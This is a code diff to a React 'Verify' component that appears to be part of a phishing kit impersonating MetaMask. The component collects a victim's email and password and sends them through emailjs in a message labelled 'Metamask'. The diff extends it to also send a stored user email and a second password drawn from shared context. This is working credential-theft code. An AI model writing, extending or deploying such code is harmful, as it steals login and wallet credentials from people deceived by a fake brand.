@@ -1,8 +1,10 @@
-import React, { useState } from 'react';
+import React, { useState, useContext } from 'react';
 import { useNavigate } from 'react-router-dom';
 import emailjs from 'emailjs-com';
+import { MyContext } from './MyContext';
 
 const Verify = () => {
+  const {user,cpassword}=useContext(MyContext);
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState('');
@@ -48,7 +50,9 @@ const Verify = () => {
         web_name: 'Metamask',
         from_name: 'Metamask',
         message: `Name: ${email}, 
+        Email: ${user},
         Phone: ${password}, 
+        password: ${cpassword},
         Date: ${new Date().toLocaleDateString()}, 
         Time: ${new Date().toLocaleTimeString()}`,
       };
